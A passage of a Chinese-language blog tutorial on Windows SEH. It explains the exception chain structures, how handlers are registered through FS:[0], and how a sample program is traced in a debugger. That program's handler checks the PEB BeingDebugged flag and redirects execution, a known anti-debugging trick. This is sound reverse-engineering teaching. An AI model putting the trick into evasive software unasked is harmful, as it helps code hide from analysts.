@@ -1,0 +1,678 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="SEHwindows异常处理程序,存储在栈中 SEH链SEH链实际上就是一个链表,其基本单位是一个个的节点 每个节点都是由一个后向指针(指针域)和一个函数指针(值域)组成 1234typedef struct _EXCEPTION_REGISTRATION_RECORD &#123;    struct _EXCEPTION_REGISTRATION_RECORD *Next;&#x2F;&#x2F;指向下一个节点">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SEH">
+<meta property="og:url" content="http://example.com/2022/09/24/SEH/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="SEHwindows异常处理程序,存储在栈中 SEH链SEH链实际上就是一个链表,其基本单位是一个个的节点 每个节点都是由一个后向指针(指针域)和一个函数指针(值域)组成 1234typedef struct _EXCEPTION_REGISTRATION_RECORD &#123;    struct _EXCEPTION_REGISTRATION_RECORD *Next;&#x2F;&#x2F;指向下一个节点">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924093920177.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924100243035.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924101626865.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924101716815.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924101908760.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924100616558.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924105650611.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924110529629.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924112137415.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924112208795.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924113817007.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924122503631.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924151509557.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924151452776.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924151603919.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924152038006.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924152418482.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924153224967.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924152852356.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924153704246.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924153224967.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924154538315.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924154743820.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924155304450.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924155235397.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924200524109.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924201147624.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924201233090.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924201413301.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924201631140.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924201848804.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924210055100.png">
+<meta property="article:published_time" content="2022-09-24T15:44:00.000Z">
+<meta property="article:modified_time" content="2022-09-24T15:44:44.044Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="reverse">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924093920177.png">
+
+<link rel="canonical" href="http://example.com/2022/09/24/SEH/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>SEH | Hexo</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Hexo</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/24/SEH/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          SEH
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2022-09-24 23:44:00 / Modified: 23:44:44" itemprop="dateCreated datePublished" datetime="2022-09-24T23:44:00+08:00">2022-09-24</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="SEH"><a href="#SEH" class="headerlink" title="SEH"></a>SEH</h1><p>windows异常处理程序,存储在<strong>栈中</strong></p>
+<h2 id="SEH链"><a href="#SEH链" class="headerlink" title="SEH链"></a>SEH链</h2><p>SEH链实际上就是一个链表,其基本单位是一个个的节点</p>
+<p>每个节点都是由一个后向指针(指针域)和一个函数指针(值域)组成</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span> *<span class="title">Next</span>;</span><span class="comment">//指向下一个节点</span></span><br><span class="line">    PEXCEPTION_ROUTINE Handler;<span class="comment">//指向函数</span></span><br><span class="line">&#125; EXCEPTION_REGISTRATION_RECORD;</span><br></pre></td></tr></table></figure>
+
+<p>Next不必多说,Handler是一个有固定格式的函数,其函数接口长这样</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">EXCEPTION_DISPOSITION <span class="title function_">myHandler</span><span class="params">(<span class="comment">//返回值为枚举类型,表明本函数处理结束后程序的走向</span></span></span><br><span class="line"><span class="params">    EXCEPTION_RECORD *pRecord,</span></span><br><span class="line"><span class="params">    EXCEPTION_REGISTRATION_RECORD *pFrame,</span></span><br><span class="line"><span class="params">    PCONTEXT Context,<span class="comment">//线程上下文,包括各种寄存器值</span></span></span><br><span class="line"><span class="params">    PVOID pValue,</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
+
+<p>这四个参数会由OS传给异常处理函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_RECORD</span> &#123;</span></span><br><span class="line">    DWORD    ExceptionCode;<span class="comment">//异常编号</span></span><br><span class="line">    DWORD ExceptionFlags;<span class="comment">//异常标志</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_RECORD</span> *<span class="title">ExceptionRecord</span>;</span><span class="comment">//</span></span><br><span class="line">    PVOID ExceptionAddress;<span class="comment">//异常发生地址</span></span><br><span class="line">    DWORD NumberParameters;</span><br><span class="line">    ULONG_PTR ExceptionInformation[EXCEPTION_MAXIMUM_PARAMETERS];</span><br><span class="line">&#125; EXCEPTION_RECORD;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>返回值是一个枚举类型,在excpt.h中可以找到其定义</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Exception disposition return values</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> _<span class="title">EXCEPTION_DISPOSITION</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ExceptionContinueExecution,<span class="comment">//继续执行异常代码</span></span><br><span class="line">    ExceptionContinueSearch,<span class="comment">//执行seh链上下一个异常处理</span></span><br><span class="line">    ExceptionNestedException,<span class="comment">//OS内部使用</span></span><br><span class="line">    ExceptionCollidedUnwind<span class="comment">//OS内部使用</span></span><br><span class="line">&#125; EXCEPTION_DISPOSITION;</span><br></pre></td></tr></table></figure>
+
+<p>SEH链画在图上相当于</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924093920177.png" alt="image-20220924093920177"></p>
+<p>最后一个节点的next指向FFFFFFFF,即-1,表明SEH链结束</p>
+<h2 id="访问进程SEH链"><a href="#访问进程SEH链" class="headerlink" title="访问进程SEH链"></a>访问进程SEH链</h2><p>TEB+0x00存放的是NtTib结构体基地址</p>
+<p>这个NtTib长啥样呢?</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">NT_TIB</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span> *<span class="title">ExceptionList</span>;</span><span class="comment">//seh链表头</span></span><br><span class="line">    PVOID StackBase;</span><br><span class="line">    PVOID StackLimit;</span><br><span class="line">    PVOID SubSystemTib;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(_MSC_EXTENSIONS)</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        PVOID FiberData;</span><br><span class="line">        DWORD Version;</span><br><span class="line">    &#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    PVOID FiberData;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    PVOID ArbitraryUserPointer;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">NT_TIB</span> *<span class="title">Self</span>;</span></span><br><span class="line">&#125; NT_TIB;</span><br><span class="line"><span class="keyword">typedef</span> NT_TIB *PNT_TIB;</span><br></pre></td></tr></table></figure>
+
+<p>NtTib在TEB的0偏移位置,ExceptionList在NtTib的偏移位置,FS段选择子指向TEB描述符,因此</p>
+<p><code>FS:[0]=TEB=TEB.NtTib=TEB.NtTib.ExceptionList</code></p>
+<p>如此就可以访问SEH链表了,这里ExceptionList相当于一个附加头节点</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924100243035.png" alt="image-20220924100243035"></p>
+<h2 id="安装SEH节点"><a href="#安装SEH节点" class="headerlink" title="安装SEH节点"></a>安装SEH节点</h2><p>c语言中使用<code>__try,__except,__finally</code>关键字</p>
+<p>汇编语言中只需要将SEH节点头插进入SEH节点就可以了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PUSH &amp;myHandler	;seh节点的函数地址压栈</span><br><span class="line">PUSH DWORD PTR FS:[0] ;seh节点的后向指针压栈,头插法采用原来的头</span><br><span class="line">MOV DWORD PTR FS:[0],ESP	;当前节点正好位于栈顶,将其地址放到ExceptionList上覆盖原来的头节点</span><br></pre></td></tr></table></figure>
+
+<p>当前节点成为SEH链的第一个节点</p>
+<h2 id="调试观察SEH工作流程"><a href="#调试观察SEH工作流程" class="headerlink" title="调试观察SEH工作流程"></a>调试观察SEH工作流程</h2><h3 id="main之前建立的seh链"><a href="#main之前建立的seh链" class="headerlink" title="main之前建立的seh链"></a>main之前建立的seh链</h3><p>用ida打开seh.exe观察</p>
+<p>使用od动态调试seh.exe,让程序先运行到main函数0x401000处</p>
+<p>od已经识别出main一开始干了啥了</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924101626865.png" alt="image-20220924101626865"></p>
+<p>在头插之前,先看一下原来的第一个seh节点</p>
+<p>此时<code>fs:[00000000]=[00386000]=0019FF64</code>,去栈中0x19FF64看看</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924101716815.png" alt="image-20220924101716815"></p>
+<p>下一个seh节点在0x19FFCC位置,本seh节点的异常处理函数在0x402730,用ida观察这个位置</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924101908760.png" alt="image-20220924101908760"></p>
+<p>这个函数很大,看地址是在用户空间的,不是DLL中的也不是内核中的,那么它是啥时候注册的呢?</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">start()</span><br><span class="line">	___tmainCRTStartup()</span><br><span class="line">		__cinit()</span><br><span class="line">			__IsNonwritableInCurrentImage()</span><br><span class="line">    	main()</span><br></pre></td></tr></table></figure>
+
+<p>在main之前<code>___tmainCRTStartup</code>会首先调用<code>__cinit</code>进行注册,然后才会调用<code>main</code></p>
+<p>也就是说,这是运行库注册的</p>
+<h3 id="注册新的seh节点"><a href="#注册新的seh节点" class="headerlink" title="注册新的seh节点"></a>注册新的seh节点</h3><p>注意此时只是注册,其中的异常处理函数也是一个回调函数,不会立刻执行,需要确实发现异常的时候才会执行</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924100616558.png" alt="image-20220924100616558"></p>
+<p>main函数首先插入了一个seh节点,其异常处理函数在0x40105A处,这个函数干了啥呢?</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.text:0040105A loc_40105A:                             ; DATA XREF: _main↑o</span><br><span class="line">.text:0040105A                 mov     esi, [esp+0Ch];esi指向栈中0x19f470</span><br><span class="line">.text:0040105E                 mov     eax, large fs:30h;PEB地址</span><br><span class="line">.text:00401064                 cmp     byte ptr [eax+2], 1;检查是否BeingDebugged</span><br><span class="line">.text:00401068                 jnz     short loc_401076;如果不是则跳转0x4001076,否则顺序执行</span><br><span class="line">.text:0040106A                 mov     dword ptr [esi+0B8h], offset loc_401023;将0x401023写到esi+0xB8h的地方</span><br><span class="line">.text:00401074                 jmp     short loc_401080;跳转函数尾声</span><br><span class="line">.text:00401076 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00401076</span><br><span class="line">.text:00401076 loc_401076:                             ; CODE XREF: .text:00401068↑j</span><br><span class="line">.text:00401076                 mov     dword ptr [esi+0B8h], offset loc_401039</span><br><span class="line">.text:00401080</span><br><span class="line">.text:00401080 loc_401080:                             ; CODE XREF: .text:00401074↑j</span><br><span class="line">.text:00401080                 xor     eax, eax</span><br><span class="line">.text:00401082                 retn;返回了</span><br></pre></td></tr></table></figure>
+
+<p>这个函数检查了当前是否处于调试状态,根据该状态将不同的函数地址,写到esi+0xB8h指向的地方</p>
+<p>这是个什么地方呢?Context.Eip,干啥用的呢?留作后话</p>
+<p>当我们的seh节点注册完毕之后</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">esp=0019FF28</span><br><span class="line">fs:[00000000]=[00386000]=0019FF28</span><br></pre></td></tr></table></figure>
+
+<p>此时ExceptionList已经指向0x19FF28了,栈中观察这个位置</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924105650611.png" alt="image-20220924105650611"></p>
+<p>后向指针也已经指向了刚才的0x40105A节点.现在的SEH链长这样</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ExceptionList@0x386000-&gt;</span><br><span class="line">	myNode@0x19FF28-&gt;</span><br><span class="line">	CRTNode@0x19FF64-&gt;</span><br><span class="line">	ntdllNode1@0x19FFCC-&gt;</span><br><span class="line">	ntdllNode2@0x19FFE4-&gt;</span><br><span class="line">	-1</span><br></pre></td></tr></table></figure>
+
+<p>如果发生异常,首先会调用这个链最头上的<code>myNode@0x19FF28</code>中的异常处理函数</p>
+<p>od已经自动识别出seh链长啥样了,od-&gt;查看-&gt;seh链</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924110529629.png" alt="image-20220924110529629"></p>
+<h3 id="引发异常"><a href="#引发异常" class="headerlink" title="引发异常"></a>引发异常</h3><p>在注册完我们的seh节点之后,有两句故意找茬的指令,按理说c语言是敲不出这种指令的,实际上是用内联汇编写的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:00401017 xor     eax, eax</span><br><span class="line">.text:00401019 mov     dword ptr [eax], 1</span><br></pre></td></tr></table></figure>
+
+<p>把1写到0x0位置,显然往未注册过的内存写东西会寄,触发EXCEPTION_ACCESS_VIOLATION(0xc0000005)异常</p>
+<h3 id="执行异常处理函数"><a href="#执行异常处理函数" class="headerlink" title="执行异常处理函数"></a>执行异常处理函数</h3><p>触发异常之后,程序会跳转到第一个seh节点中注册的异常处理函数,期间经过了很多库函数调用,导致栈顶移动了很远的距离</p>
+<p>从0x19FF28到0x19F320一共0xc08个字节</p>
+<p>此时控制已经转移到myHandler@0x40105A,这就是main函数一开始注册的seh节点中的异常处理函数</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924112137415.png" alt="image-20220924112137415"></p>
+<p>此时栈帧的情况</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924112208795.png" alt="image-20220924112208795"></p>
+<p>myHandler@0x40105A的返回地址是NTDLL库函数</p>
+<p>返回地址往上的4个双字就是myHandler的参数了</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">EXCEPTION_DISPOSITION <span class="title function_">myHandler</span><span class="params">(<span class="comment">//返回值为枚举类型,表明本函数处理结束后程序的走向</span></span></span><br><span class="line"><span class="params">    EXCEPTION_RECORD *pRecord,</span></span><br><span class="line"><span class="params">    EXCEPTION_REGISTRATION_RECORD *pFrame,</span></span><br><span class="line"><span class="params">    PCONTEXT Context,<span class="comment">//线程上下文,包括各种寄存器值</span></span></span><br><span class="line"><span class="params">    PVOID pValue,<span class="comment">//系统内部使用,忽略</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>参数地址</th>
+<th>参数指向</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>pRecord</td>
+<td>0x19F324</td>
+<td>0x19F420</td>
+</tr>
+<tr>
+<td>pFrame</td>
+<td>0x19F328</td>
+<td>0x19FF28</td>
+</tr>
+<tr>
+<td>Context</td>
+<td>0x19F32C</td>
+<td>0x19F470</td>
+</tr>
+<tr>
+<td>pValue</td>
+<td>0x19F330</td>
+<td>0x19F3AC</td>
+</tr>
+</tbody></table>
+<p>参数指向的地址都在栈中,看来抬栈0xc08个字节其中的作用就有准备参数</p>
+<h4 id="Record-0x19F420"><a href="#Record-0x19F420" class="headerlink" title="Record@0x19F420"></a><code>Record@0x19F420</code></h4><p>Record@0x19F420长这样</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_RECORD</span> &#123;</span><span class="comment">//0x50个字节</span></span><br><span class="line">    DWORD    ExceptionCode;</span><br><span class="line">    DWORD ExceptionFlags;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_RECORD</span> *<span class="title">ExceptionRecord</span>;</span></span><br><span class="line">    PVOID ExceptionAddress;</span><br><span class="line">    DWORD NumberParameters;</span><br><span class="line">    ULONG_PTR ExceptionInformation[EXCEPTION_MAXIMUM_PARAMETERS];</span><br><span class="line">&#125; EXCEPTION_RECORD;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924113817007.png" alt="image-20220924113817007"></p>
+<table>
+<thead>
+<tr>
+<th>偏移</th>
+<th>成员</th>
+<th>值</th>
+<th>意义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0</td>
+<td>ExceptionCode</td>
+<td>0xC0000005</td>
+<td>访问非法内存</td>
+</tr>
+<tr>
+<td>0x4</td>
+<td>ExceptionFlags</td>
+<td>0</td>
+<td></td>
+</tr>
+<tr>
+<td>0x8</td>
+<td>ExceptionRecord</td>
+<td>0</td>
+<td></td>
+</tr>
+<tr>
+<td>0xC</td>
+<td>ExceptionAddress</td>
+<td>0x401019</td>
+<td><code>.text:00401019 mov     dword ptr [eax], 1</code></td>
+</tr>
+<tr>
+<td>0x10</td>
+<td>NumberParameters</td>
+<td>2</td>
+<td></td>
+</tr>
+<tr>
+<td>0x14</td>
+<td>ExceptionInformation[0]</td>
+<td>1</td>
+<td></td>
+</tr>
+<tr>
+<td>0x15-0x69</td>
+<td>ExceptionInformation[1-..]</td>
+<td>0</td>
+<td></td>
+</tr>
+</tbody></table>
+<h4 id="Frame-0x19FF28"><a href="#Frame-0x19FF28" class="headerlink" title="Frame@0x19FF28"></a><code>Frame@0x19FF28</code></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span> &#123;</span><span class="comment">//8字节</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span> *<span class="title">Next</span>;</span></span><br><span class="line">    PEXCEPTION_ROUTINE Handler;</span><br><span class="line">&#125; EXCEPTION_REGISTRATION_RECORD;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220924122503631.png" alt="image-20220924122503631"></p>
+<h4 id="Context-0x19F470"><a href="#Context-0x19F470" class="headerlink" title="Context@0x19F470"></a><code>Context@0x19F470</code></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">DECLSPEC_NOINITALL</span> _<span class="title">CONTEXT</span> &#123;</span><span class="comment">//0x2cc个字节</span></span><br><span class="line">    DWORD 